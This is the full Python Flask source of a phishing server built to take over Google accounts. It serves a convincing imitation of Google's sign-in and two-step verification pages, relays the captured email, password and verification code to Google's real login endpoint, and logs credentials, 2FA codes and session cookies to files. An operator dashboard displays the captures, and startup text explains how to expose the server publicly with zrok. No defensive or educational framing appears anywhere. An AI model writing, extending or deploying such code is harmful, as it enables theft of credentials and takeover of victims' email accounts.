from flask import Flask, request, render_template_string, redirect, make_response, session
import requests
from datetime import datetime
import json
import secrets
import os
import re
import time
import threading

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# ============ CONFIGURATION ============
class Config:
    GOOGLE_AUTH = "https://accounts.google.com/ServiceLoginAuth"
    GOOGLE_LOGIN = "https://accounts.google.com/ServiceLogin"
    
    # Store pending sessions
    PENDING_LOGINS = {}
    
    STATS = {
        'total_visits': 0,
        'credentials_captured': 0,
        'tfa_captured': 0,
        'full_access': 0,
        'failed': 0
    }

# ============ BEAUTIFUL LOGIN PAGE (Looks Real) ============
LOGIN_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 450px;
            padding: 20px;
        }
        .card {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            background: white;
        }
        .logo {
            text-align: center;
            margin-bottom: 25px;
        }
        .logo img {
            width: 75px;
            height: 75px;
        }
        .title {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            color: #202124;
            margin-bottom: 5px;
        }
        .subtitle {
            text-align: center;
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }
        .form-group input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: all 0.2s;
            background: #fff;
        }
        .form-group input:focus {
            border-color: #1a73e8;
            outline: none;
            box-shadow: 0 1px 3px rgba(26,115,232,0.3);
        }
        .form-group input.error {
            border-color: #d93025;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        .btn:hover {
            background: #1557b0;
        }
        .btn:active {
            transform: scale(0.98);
        }
        .footer {
            text-align: center;
            margin-top: 25px;
            font-size: 14px;
            color: #5f6368;
        }
        .footer a {
            color: #1a73e8;
            text-decoration: none;
            margin: 0 10px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .error-message {
            color: #d93025;
            text-align: center;
            font-size: 14px;
            margin-bottom: 15px;
            display: none;
        }
        .error-message.show {
            display: block;
        }
        .password-toggle {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            background: none;
            border: none;
            font-size: 18px;
            color: #5f6368;
        }
        @media (max-width: 480px) {
            .card {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google">
            </div>
            <h1 class="title">Sign in</h1>
            <p class="subtitle">to continue to Gmail</p>
            <div id="errorMsg" class="error-message">Wrong password. Please try again.</div>
            <form action="/login" method="POST" id="loginForm">
                <div class="form-group">
                    <input type="email" name="Email" id="email" placeholder="Email or phone" required autofocus>
                </div>
                <div class="form-group">
                    <input type="password" name="Passwd" id="password" placeholder="Password" required>
                    <button type="button" class="password-toggle" onclick="togglePassword()">👁️</button>
                </div>
                <button type="submit" class="btn">Next</button>
            </form>
            <div class="footer">
                <a href="#">Create account</a>
                <span>·</span>
                <a href="#">Forgot email?</a>
            </div>
        </div>
    </div>
    <script>
        function togglePassword() {
            const password = document.getElementById('password');
            password.type = password.type === 'password' ? 'text' : 'password';
        }
        
        // Show error if redirected with error
        if (window.location.search.includes('error=1')) {
            document.getElementById('errorMsg').classList.add('show');
            document.getElementById('email').classList.add('error');
            document.getElementById('password').classList.add('error');
        }
        
        // Focus email field
        document.getElementById('email').focus();
    </script>
</body>
</html>
'''

# ============ FAKE 2FA PAGE (Captures 2FA Code) ============
TFA_PAGE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2-Step Verification - Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 450px;
            padding: 20px;
        }
        .card {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            background: white;
        }
        .logo {
            text-align: center;
            margin-bottom: 25px;
        }
        .logo img {
            width: 75px;
            height: 75px;
        }
        .title {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            color: #202124;
            margin-bottom: 5px;
        }
        .subtitle {
            text-align: center;
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 25px;
        }
        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 25px;
        }
        .code-inputs input {
            width: 48px;
            height: 55px;
            text-align: center;
            font-size: 28px;
            border: 2px solid #dadce0;
            border-radius: 4px;
            transition: all 0.2s;
            font-weight: 500;
        }
        .code-inputs input:focus {
            border-color: #1a73e8;
            outline: none;
            box-shadow: 0 1px 3px rgba(26,115,232,0.3);
        }
        .code-inputs input.error {
            border-color: #d93025;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover {
            background: #1557b0;
        }
        .btn:disabled {
            background: #dadce0;
            cursor: not-allowed;
        }
        .timer {
            text-align: center;
            color: #5f6368;
            font-size: 14px;
            margin-top: 15px;
        }
        .timer.warning {
            color: #f9ab00;
        }
        .timer.danger {
            color: #d93025;
            font-weight: 500;
        }
        .footer {
            margin-top: 20px;
            text-align: center;
            color: #5f6368;
            font-size: 14px;
        }
        .footer a {
            color: #1a73e8;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .error-message {
            color: #d93025;
            text-align: center;
            font-size: 14px;
            margin-bottom: 15px;
            display: none;
        }
        .error-message.show {
            display: block;
        }
        .device-info {
            background: #f8f9fa;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #5f6368;
            text-align: center;
        }
        .device-info strong {
            color: #202124;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google">
            </div>
            <h1 class="title">2-Step Verification</h1>
            <p class="subtitle">Enter the verification code from your authenticator app</p>
            
            <div class="device-info">
                🔐 <strong>{{ email }}</strong><br>
                We sent a verification code to your device
            </div>
            
            <div id="errorMsg" class="error-message">Invalid verification code. Please try again.</div>
            
            <form action="/2fa" method="POST" id="tfaForm">
                <div class="code-inputs" id="codeInputs">
                    <input type="text" maxlength="1" pattern="[0-9]" required>
                    <input type="text" maxlength="1" pattern="[0-9]" required>
                    <input type="text" maxlength="1" pattern="[0-9]" required>
                    <input type="text" maxlength="1" pattern="[0-9]" required>
                    <input type="text" maxlength="1" pattern="[0-9]" required>
                    <input type="text" maxlength="1" pattern="[0-9]" required>
                </div>
                <input type="hidden" name="code" id="codeHidden">
                <button type="submit" class="btn" id="verifyBtn">Verify</button>
            </form>
            
            <div class="timer" id="timer">Code expires in: 30 seconds</div>
            <div class="footer">
                <a href="#">Try another way</a>
            </div>
        </div>
    </div>
    <script>
        const inputs = document.querySelectorAll('.code-inputs input');
        const hidden = document.getElementById('codeHidden');
        const errorMsg = document.getElementById('errorMsg');
        const verifyBtn = document.getElementById('verifyBtn');
        
        // Auto-focus first input
        inputs[0].focus();
        
        // Handle input
        inputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                // Only allow numbers
                this.value = this.value.replace(/[^0-9]/g, '');
                
                // Remove error state
                this.classList.remove('error');
                errorMsg.classList.remove('show');
                
                // Move to next
                if (this.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                
                // Update hidden
                let code = '';
                inputs.forEach(i => code += i.value);
                hidden.value = code;
                
                // Auto-submit if 6 digits entered
                if (code.length === 6) {
                    verifyBtn.disabled = true;
                    verifyBtn.textContent = 'Verifying...';
                    document.getElementById('tfaForm').submit();
                }
            });
            
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                    inputs[index - 1].focus();
                }
                if (e.key === 'Enter') {
                    document.getElementById('tfaForm').submit();
                }
            });
            
            // Paste support
            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text');
                const digits = paste.replace(/[^0-9]/g, '').slice(0, 6);
                digits.split('').forEach((digit, i) => {
                    if (i < inputs.length) {
                        inputs[i].value = digit;
                    }
                });
                let code = '';
                inputs.forEach(i => code += i.value);
                hidden.value = code;
                if (code.length === 6) {
                    document.getElementById('tfaForm').submit();
                }
            });
        });
        
        // Timer
        let timeLeft = 30;
        const timer = document.getElementById('timer');
        const interval = setInterval(() => {
            timeLeft--;
            timer.textContent = `Code expires in: ${timeLeft} seconds`;
            
            if (timeLeft <= 10) {
                timer.className = 'timer warning';
            }
            if (timeLeft <= 5) {
                timer.className = 'timer danger';
            }
            if (timeLeft <= 0) {
                clearInterval(interval);
                timer.textContent = 'Code expired! Please request a new one.';
                timer.className = 'timer danger';
            }
        }, 1000);
        
        // Show error if redirected with error
        if (window.location.search.includes('error=1')) {
            errorMsg.classList.add('show');
            inputs.forEach(input => input.classList.add('error'));
        }
    </script>
</body>
</html>
'''

# ============ LOADING PAGE ============
LOADING_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="2;url=https://mail.google.com">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container { text-align: center; }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1a73e8;
            border-radius: 50%;
            width: 48px;
            height: 48px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .title { color: #202124; font-size: 24px; margin: 20px 0 10px; }
        .subtitle { color: #5f6368; font-size: 16px; }
        .progress {
            width: 100%;
            max-width: 300px;
            height: 4px;
            background: #e0e0e0;
            border-radius: 2px;
            margin: 20px auto;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: #1a73e8;
            border-radius: 2px;
            animation: progress 2s ease-in-out;
        }
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h2 class="title">Signing you in...</h2>
        <p class="subtitle">Please wait while we redirect you to Gmail</p>
        <div class="progress"><div class="progress-bar"></div></div>
    </div>
</body>
</html>
'''

# ============ DASHBOARD ============
DASHBOARD_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Phishing Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: #fff; padding: 20px 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px; }
        .header h1 { margin: 0; color: #202124; }
        .header .subtitle { color: #5f6368; font-size: 14px; margin-top: 5px; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
        .stat-card .number { font-size: 36px; font-weight: bold; color: #1a73e8; }
        .stat-card .label { color: #5f6368; font-size: 14px; margin-top: 5px; }
        .stat-card.success .number { color: #34a853; }
        .stat-card.warning .number { color: #f9ab00; }
        .stat-card.danger .number { color: #d93025; }
        .section { background: #fff; padding: 20px 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px; }
        .section h2 { margin: 0 0 15px 0; color: #202124; font-size: 18px; border-bottom: 2px solid #f5f5f5; padding-bottom: 10px; }
        .table-responsive { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th { text-align: left; padding: 12px 8px; background: #f8f9fa; color: #5f6368; font-weight: 500; border-bottom: 2px solid #e0e0e0; }
        td { padding: 12px 8px; border-bottom: 1px solid #f0f0f0; }
        tr:hover { background: #f8f9fa; }
        .badge { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: 500; }
        .badge.success { background: #e6f4ea; color: #34a853; }
        .badge.warning { background: #fef7e0; color: #f9ab00; }
        .badge.danger { background: #fce8e6; color: #d93025; }
        .badge.info { background: #e8f0fe; color: #1a73e8; }
        .actions { margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap; }
        .btn { padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s; }
        .btn-primary { background: #1a73e8; color: white; }
        .btn-primary:hover { background: #1557b0; }
        .btn-danger { background: #d93025; color: white; }
        .btn-danger:hover { background: #b3261e; }
        .btn-secondary { background: #e8eaed; color: #202124; }
        .btn-secondary:hover { background: #d2d5d9; }
        .empty-state { text-align: center; padding: 40px 20px; color: #5f6368; }
        .empty-state .icon { font-size: 48px; margin-bottom: 10px; }
        .cookie-box { background: #f8f9fa; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 12px; word-break: break-all; max-height: 100px; overflow: auto; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Phishing Dashboard</h1>
            <div class="subtitle">Live monitoring and captured data</div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card"><div class="number">{{ stats.total_visits }}</div><div class="label">Total Visits</div></div>
            <div class="stat-card warning"><div class="number">{{ stats.credentials_captured }}</div><div class="label">Credentials</div></div>
            <div class="stat-card"><div class="number">{{ stats.tfa_captured }}</div><div class="label">2FA Codes</div></div>
            <div class="stat-card success"><div class="number">{{ stats.full_access }}</div><div class="label">Full Access</div></div>
            <div class="stat-card danger"><div class="number">{{ stats.failed }}</div><div class="label">Failed</div></div>
        </div>
        
        <div class="section">
            <h2>📋 Recent Captures</h2>
            <div class="table-responsive">
                <table>
                    <thead>
                        <tr>
                            <th>Time</th>
                            <th>Email</th>
                            <th>Password</th>
                            <th>2FA Code</th>
                            <th>Status</th>
                            <th>Cookies</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for entry in captures %}
                        <tr>
                            <td>{{ entry.time }}</td>
                            <td><strong>{{ entry.email }}</strong></td>
                            <td>{{ entry.password }}</td>
                            <td>{% if entry.tfa %}<span class="badge info">{{ entry.tfa }}</span>{% else %}—{% endif %}</td>
                            <td>
                                {% if entry.status == 'full' %}
                                <span class="badge success">✅ Full Access</span>
                                {% elif entry.status == 'partial' %}
                                <span class="badge warning">⚠️ Credentials Only</span>
                                {% else %}
                                <span class="badge danger">❌ Failed</span>
                                {% endif %}
                            </td>
                            <td>
                                {% if entry.cookies %}
                                <div class="cookie-box">{{ entry.cookies|truncate(80) }}</div>
                                {% else %}
                                —
                                {% endif %}
                            </td>
                        </tr>
                        {% endfor %}
                        {% if not captures %}
                        <tr><td colspan="6"><div class="empty-state"><div class="icon">📭</div><p>No captures yet</p></div></td></tr>
                        {% endif %}
                    </tbody>
                </table>
            </div>
        </div>
        
        <div class="section">
            <h2>🛠️ Actions</h2>
            <div class="actions">
                <a href="/" class="btn btn-primary" target="_blank">🔗 Phishing Page</a>
                <a href="/clear" class="btn btn-danger" onclick="return confirm('Clear all data?')">🗑️ Clear All</a>
            </div>
        </div>
    </div>
</body>
</html>
'''

# ============ ROUTES ============
@app.route('/')
def index():
    Config.STATS['total_visits'] += 1
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    """Step 1: Capture email + password, then forward to real Google"""
    email = request.form.get('Email')
    password = request.form.get('Passwd')
    ip = request.remote_addr
    
    print(f"\n{'='*70}")
    print(f"[+] 📧 CREDENTIALS CAPTURED at: {datetime.now()}")
    print(f"[+] Email: {email}")
    print(f"[+] Password: {password}")
    print(f"[+] IP: {ip}")
    print(f"{'='*70}")
    
    if not email or not password:
        return "Email and password required", 400
    
    # Save credentials immediately
    with open('captured_creds.txt', 'a') as f:
        f.write(f"\n{'='*70}\n")
        f.write(f"Time: {datetime.now()}\n")
        f.write(f"Email: {email}\n")
        f.write(f"Password: {password}\n")
        f.write(f"IP: {ip}\n")
        f.write(f"{'='*70}\n")
    
    Config.STATS['credentials_captured'] += 1
    
    # Create a Google session and try to login
    try:
        google_session = requests.Session()
        
        # Headers to look like a real browser
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://accounts.google.com',
            'Referer': 'https://accounts.google.com/ServiceLogin',
            'DNT': '1',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }
        google_session.headers.update(headers)
        
        # First, get login page for cookies and tokens
        print("[+] Getting Google login page...")
        login_page = google_session.get(
            'https://accounts.google.com/ServiceLogin',
            params={
                'service': 'mail',
                'continue': 'https://mail.google.com',
                'flowName': 'GlifWebSignIn',
                'flowEntry': 'ServiceLogin'
            }
        )
        
        # Extract GALX token
        galx_match = re.search(r'name="GALX"\s+value="([^"]+)"', login_page.text)
        galx = galx_match.group(1) if galx_match else None
        
        print(f"[+] GALX Token: {galx}")
        
        # Extract other hidden fields
        hidden_fields = {}
        for match in re.finditer(r'name="([^"]+)"\s+value="([^"]*)"', login_page.text):
            name, value = match.groups()
            if name not in ['Email', 'Passwd', 'PersistentCookie']:
                hidden_fields[name] = value
        
        # Prepare login data
        login_data = {
            'Email': email,
            'Passwd': password,
            'service': 'mail',
            'continue': 'https://mail.google.com',
            'flowName': 'GlifWebSignIn',
            'flowEntry': 'ServiceLogin',
            'PersistentCookie': 'yes',
            'GALX': galx
        }
        login_data.update(hidden_fields)
        
        # Submit to real Google
        print("[+] Sending credentials to real Google...")
        auth_response = google_session.post(
            'https://accounts.google.com/ServiceLoginAuth',
            data=login_data,
            allow_redirects=False
        )
        
        print(f"[+] Response Status: {auth_response.status_code}")
        
        # Check response
        if auth_response.status_code == 302:
            location = auth_response.headers.get('Location', '')
            print(f"[+] Location: {location}")
            
            # Check if 2FA is required
            if 'challenge' in location or '2fa' in location or 'two-step' in location:
                print(f"[!] 🔐 2FA REQUIRED for: {email}")
                
                # Store session for 2FA completion
                session_id = secrets.token_hex(32)
                Config.PENDING_LOGINS[session_id] = {
                    'session': google_session,
                    'email': email,
                    'password': password,
                    'cookies': google_session.cookies.get_dict(),
                    'timestamp': datetime.now()
                }
                
                # Show 2FA page with email
                resp = make_response(render_template_string(TFA_PAGE, email=email))
                resp.set_cookie('session_id', session_id, max_age=300, httponly=True)
                return resp
            
            # Check if login was successful (redirects to Gmail)
            if 'mail.google.com' in location:
                print(f"[+] ✅ LOGIN SUCCESSFUL for: {email}")
                cookies = google_session.cookies.get_dict()
                
                with open('successful_logins.txt', 'a') as f:
                    f.write(f"\n{'='*70}\n")
                    f.write(f"Time: {datetime.now()}\n")
                    f.write(f"Email: {email}\n")
                    f.write(f"Password: {password}\n")
                    f.write(f"Cookies: {json.dumps(cookies, indent=2)}\n")
                    f.write(f"{'='*70}\n")
                
                Config.STATS['full_access'] += 1
                return render_template_string(LOADING_PAGE)
        
        # Check for wrong password
        if 'incorrect' in auth_response.text.lower() or 'wrong' in auth_response.text.lower():
            print(f"[!] ❌ WRONG PASSWORD for: {email}")
            Config.STATS['failed'] += 1
            return redirect('/?error=1')
        
        # Unknown response
        print(f"[!] ⚠️ UNKNOWN RESPONSE")
        Config.STATS['failed'] += 1
        return redirect('/?error=1')
        
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        Config.STATS['failed'] += 1
        return redirect('/?error=1')

@app.route('/2fa', methods=['POST'])
def two_factor():
    """Step 2: Capture 2FA code, then complete login on real Google"""
    code = request.form.get('code')
    session_id = request.cookies.get('session_id')
    
    print(f"\n{'='*70}")
    print(f"[!] 🔑 2FA CODE CAPTURED at: {datetime.now()}")
    print(f"[!] Code: {code}")
    print(f"[!] Session ID: {session_id}")
    print(f"{'='*70}")
    
    if not session_id or session_id not in Config.PENDING_LOGINS:
        return "Session expired. Please try again.", 400
    
    saved = Config.PENDING_LOGINS[session_id]
    google_session = saved['session']
    email = saved['email']
    password = saved['password']
    
    # Save 2FA code
    with open('tfa_codes.txt', 'a') as f:
        f.write(f"\n{'='*70}\n")
        f.write(f"Time: {datetime.now()}\n")
        f.write(f"Email: {email}\n")
        f.write(f"2FA Code: {code}\n")
        f.write(f"{'='*70}\n")
    
    Config.STATS['tfa_captured'] += 1
    
    print(f"[+] Sending 2FA code to real Google...")
    
    try:
        # Complete login with 2FA
        login_data = {
            'Email': email,
            'Passwd': password,
            'service': 'mail',
            'continue': 'https://mail.google.com',
            '2fa_code': code,
            'flowName': 'GlifWebSignIn'
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Origin': 'https://accounts.google.com',
            'Referer': 'https://accounts.google.com/ServiceLogin'
        }
        google_session.headers.update(headers)
        
        # Submit 2FA code to Google
        tfa_response = google_session.post(
            'https://accounts.google.com/ServiceLoginAuth',
            data=login_data,
            allow_redirects=False
        )
        
        print(f"[+] 2FA Response Status: {tfa_response.status_code}")
        
        if tfa_response.status_code == 302:
            location = tfa_response.headers.get('Location', '')
            print(f"[+] Location: {location}")
            
            if 'mail.google.com' in location:
                cookies = google_session.cookies.get_dict()
                
                with open('full_access.txt', 'a') as f:
                    f.write("\n" + "="*70)
                    f.write(f"\n[!!!] 🔓 FULL ACCESS ACQUIRED\n")
                    f.write(f"Time: {datetime.now()}\n")
                    f.write(f"Email: {email}\n")
                    f.write(f"Password: {password}\n")
                    f.write(f"2FA Code: {code}\n")
                    f.write(f"Cookies: {json.dumps(cookies, indent=2)}\n")
                    f.write("="*70 + "\n")
                
                print(f"\n[!!!] ✅ FULL ACCESS ACQUIRED!")
                print(f"[!!!] Email: {email}")
                print(f"[!!!] 2FA Code: {code}")
                print(f"[!!!] Cookies: {list(cookies.keys())}")
                
                Config.STATS['full_access'] += 1
                del Config.PENDING_LOGINS[session_id]
                
                return render_template_string(LOADING_PAGE)
        
        # Check if 2FA code was wrong
        if 'invalid' in tfa_response.text.lower() or 'wrong' in tfa_response.text.lower():
            print(f"[!] ❌ Invalid 2FA code for: {email}")
            return redirect('/2fa?error=1')
        
        print(f"[!] ❌ 2FA failed for: {email}")
        return redirect('/2fa?error=1')
        
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return redirect('/2fa?error=1')

@app.route('/dashboard')
def dashboard():
    captures = load_captures()
    return render_template_string(DASHBOARD_PAGE, stats=Config.STATS, captures=captures[-20:])

@app.route('/clear')
def clear_data():
    files = ['captured_creds.txt', 'tfa_codes.txt', 'full_access.txt', 'successful_logins.txt']
    for f in files:
        if os.path.exists(f):
            os.remove(f)
    Config.STATS = {'total_visits': 0, 'credentials_captured': 0, 'tfa_captured': 0, 'full_access': 0, 'failed': 0}
    Config.PENDING_LOGINS = {}
    return redirect('/dashboard')

# ============ HELPER FUNCTIONS ============
def load_captures():
    captures = []
    
    try:
        with open('captured_creds.txt', 'r') as f:
            content = f.read()
            entries = content.split('='*70)
            for entry in entries:
                if 'Email:' in entry:
                    lines = entry.strip().split('\n')
                    data = {}
                    for line in lines:
                        if 'Time:' in line:
                            data['time'] = line.replace('Time:', '').strip()
                        elif 'Email:' in line:
                            data['email'] = line.replace('Email:', '').strip()
                        elif 'Password:' in line:
                            data['password'] = line.replace('Password:', '').strip()
                    if 'email' in data:
                        data['status'] = 'partial'
                        data['tfa'] = ''
                        data['cookies'] = ''
                        captures.append(data)
    except:
        pass
    
    try:
        with open('full_access.txt', 'r') as f:
            content = f.read()
            entries = content.split('='*70)
            for entry in entries:
                if 'Email:' in entry:
                    lines = entry.strip().split('\n')
                    data = {}
                    for line in lines:
                        if 'Time:' in line:
                            data['time'] = line.replace('Time:', '').strip()
                        elif 'Email:' in line:
                            data['email'] = line.replace('Email:', '').strip()
                        elif 'Password:' in line:
                            data['password'] = line.replace('Password:', '').strip()
                        elif '2FA Code:' in line:
                            data['tfa'] = line.replace('2FA Code:', '').strip()
                        elif 'Cookies:' in line:
                            data['cookies'] = line.replace('Cookies:', '').strip()[:100]
                    if 'email' in data:
                        data['status'] = 'full'
                        found = False
                        for c in captures:
                            if c.get('email') == data['email']:
                                c.update(data)
                                found = True
                                break
                        if not found:
                            captures.append(data)
    except:
        pass
    
    captures.sort(key=lambda x: x.get('time', ''), reverse=True)
    return captures

# ============ MAIN ============
if __name__ == '__main__':
    print("\n" + "="*70)
    print("🔐 COMPLETE PHISHING SYSTEM - 2FA READY")
    print("="*70)
    print("✅ Step 1: Fake Login Page → Captures Email + Password")
    print("✅ Step 2: Forwards to Real Google → Triggers 2FA")
    print("✅ Step 3: Fake 2FA Page → Captures Verification Code")
    print("✅ Step 4: Forwards 2FA Code → Gains Full Access")
    print("="*70)
    print(f"📁 Login Page: http://localhost:5000/")
    print(f"📊 Dashboard: http://localhost:5000/dashboard")
    print("\n[!] Expose with zrok:")
    print("    zrok share public http://localhost:5000")
    print("\n[+] Server starting...\n")
    
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
